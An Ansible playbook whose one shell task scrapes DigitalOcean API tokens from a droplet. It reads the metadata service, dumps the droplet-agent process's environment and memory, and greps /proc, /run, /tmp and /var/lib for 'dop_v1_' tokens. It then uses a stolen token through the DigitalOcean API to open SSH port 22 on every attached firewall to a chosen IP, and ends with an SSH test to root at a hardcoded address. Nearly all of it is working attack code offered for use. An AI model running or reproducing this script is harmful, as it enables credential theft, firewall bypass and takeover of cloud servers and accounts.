---
- name: Get DO token from metadata and whitelist SSH
  hosts: all
  gather_facts: false

  tasks:
    - name: Full metadata + token extraction + firewall whitelist
      ansible.builtin.shell: |
        #!/bin/bash
        set -uo pipefail
        TARGET_IP="{{ TARGET_IP | default('') }}"

        echo "======================================"
        echo "STEP 1: DigitalOcean Metadata API"
        echo "======================================"

        META=$(curl -sf http://169.254.169.254/metadata/v1.json)
        echo "$META"

        DROPLET_ID=$(echo "$META" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['droplet_id'])" \
          2>/dev/null || \
          curl -sf http://169.254.169.254/metadata/v1/id)

        REGION=$(curl -sf http://169.254.169.254/metadata/v1/region)

        echo "Droplet ID: $DROPLET_ID"
        echo "Region: $REGION"

        echo ""
        echo "======================================"
        echo "STEP 2: Extract droplet-agent token"
        echo "======================================"

        AGENT_PID=$(pgrep -f droplet-agent | head -1)
        echo "Agent PID: $AGENT_PID"

        if [[ -n "$AGENT_PID" ]]; then
          echo "=== Agent environment ==="
          cat /proc/$AGENT_PID/environ 2>/dev/null | tr '\0' '\n'

          echo "=== Agent open files ==="
          ls -la /proc/$AGENT_PID/fd 2>/dev/null

          echo "=== Agent maps (loaded files) ==="
          cat /proc/$AGENT_PID/maps 2>/dev/null | \
            grep -v "\.so" | grep "/" | awk '{print $6}' | sort -u

          echo "=== Agent cmdline ==="
          cat /proc/$AGENT_PID/cmdline 2>/dev/null | tr '\0' ' '

          echo "=== Agent memory scan for token ==="
          strings /proc/$AGENT_PID/mem 2>/dev/null | \
            grep -E "dop_v1_[a-f0-9]+" | head -5 || true
          strings /proc/$AGENT_PID/exe 2>/dev/null | \
            grep -iE "token|auth|bearer|api" | head -20
        fi

        echo "=== Droplet agent files ==="
        find /opt/digitalocean /etc/droplet-agent \
          /var/lib/droplet-agent /run/droplet-agent \
          /.droplet-agent 2>/dev/null -type f -ls
        find /opt/digitalocean /etc/droplet-agent \
          /var/lib/droplet-agent /run/droplet-agent \
          /.droplet-agent 2>/dev/null -type f | \
          xargs grep -aE "dop_v1_|DO_TOKEN|DIGITALOCEAN" 2>/dev/null | head -50

        echo "=== Metadata token endpoints ==="
        curl -sf http://169.254.169.254/metadata/v1/auth/token 2>/dev/null || true
        curl -sf -X PUT \
          -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
          http://169.254.169.254/latest/api/token 2>/dev/null || true
        curl -sf http://169.254.169.254/metadata/v1/user-data 2>/dev/null || true
        curl -sf http://169.254.169.254/metadata/v1/vendor-data 2>/dev/null || true

        echo "=== Systemd droplet-agent service ==="
        systemctl cat droplet-agent 2>/dev/null
        journalctl -u droplet-agent --no-pager -n 50 2>/dev/null | \
          grep -iE "token|auth|key|api|bearer|init"

        echo "=== Kernel keyring ==="
        keyctl show 2>/dev/null || true
        keyctl list @s 2>/dev/null || true

        echo "=== /run filesystem scan ==="
        find /run -type f 2>/dev/null | \
          xargs grep -aE "dop_v1_|DO_TOKEN|DIGITALOCEAN" \
          2>/dev/null | head -30

        echo "=== Unix sockets ==="
        ss -xlp 2>/dev/null | grep -i "digital\|droplet\|agent"
        find /run /var/run /tmp -name "*.sock" \
          -o -name "*.socket" 2>/dev/null | \
          xargs ls -la 2>/dev/null

        echo ""
        echo "======================================"
        echo "STEP 3: Auto-whitelist using any token found"
        echo "======================================"

        DO_TOKEN=""
        if [[ -n "${AGENT_PID:-}" ]]; then
          DO_TOKEN=$(cat /proc/$AGENT_PID/environ 2>/dev/null | \
            tr '\0' '\n' | \
            grep -iE "^(DO_TOKEN|DIGITALOCEAN_TOKEN|API_TOKEN)=" | \
            cut -d= -f2 | head -1)
        fi

        if [[ -z "$DO_TOKEN" ]]; then
          DO_TOKEN=$(grep -ral "dop_v1_" /proc/*/environ 2>/dev/null | head -1 | \
            xargs cat 2>/dev/null | tr '\0' '\n' | \
            grep -oP 'dop_v1_[a-f0-9]+' | head -1)
        fi

        if [[ -z "$DO_TOKEN" ]]; then
          DO_TOKEN=$(grep -rl "dop_v1_" /run /tmp /var/lib 2>/dev/null | \
            xargs grep -oh "dop_v1_[a-f0-9]*" 2>/dev/null | head -1)
        fi

        if [[ -z "$DO_TOKEN" ]]; then
          echo "TOKEN NOT FOUND IN PROCESS/FILES"
          echo "Trying metadata identity endpoint..."
          IDENTITY=$(curl -sf http://169.254.169.254/metadata/v1/id || true)
          echo "Instance identity: $IDENTITY"
          exit 1
        fi

        echo "TOKEN FOUND: ${DO_TOKEN:0:12}..."

        if [[ -z "$TARGET_IP" ]]; then
          TARGET_IP=$(curl -sf https://api.ipify.org || \
                      curl -sf https://checkip.amazonaws.com | \
                      tr -d '[:space:]')
        fi
        echo "Whitelisting IP: $TARGET_IP"

        FIREWALLS=$(curl -sf \
          -H "Authorization: Bearer $DO_TOKEN" \
          "https://api.digitalocean.com/v2/droplets/${DROPLET_ID}/firewalls" | \
          python3 -c "
        import sys,json
        d=json.load(sys.stdin)
        for f in d.get('firewalls',[]):
            print(f['id'])
        " 2>/dev/null)

        echo "Firewalls on this droplet: $FIREWALLS"

        for FW_ID in $FIREWALLS; do
          echo -n "Adding rule to $FW_ID: "
          HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST \
            -H "Authorization: Bearer $DO_TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"inbound_rules\":[{
                  \"protocol\":\"tcp\",
                  \"ports\":\"22\",
                  \"sources\":{
                    \"addresses\":[\"${TARGET_IP}/32\"]
                  }
                }]}" \
            "https://api.digitalocean.com/v2/firewalls/${FW_ID}/rules")
          case $HTTP in
            204) echo "ADDED ✓" ;;
            422) echo "ALREADY EXISTS ✓" ;;
            401) echo "TOKEN INVALID ✗" ;;
            *)   echo "HTTP $HTTP ✗" ;;
          esac
        done

        echo ""
        echo "======================================"
        echo "STEP 4: Verify SSH now works"
        echo "======================================"
        sleep 8
        ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=10 \
            -o BatchMode=yes \
            root@64.23.139.247 \
            "echo SSH_FROM_SELF_OK; hostname; id" \
            2>&1 || echo "loopback test skipped"

        echo ""
        echo "DONE. SSH should now work from $TARGET_IP"
        echo "Test: ssh root@64.23.139.247"
      register: result
      changed_when: false
      failed_when: false
      environment:
        MODULE_STRICT_UTF8_RESPONSE: "false"

    - name: Output
      ansible.builtin.debug:
        var: result.stdout_lines
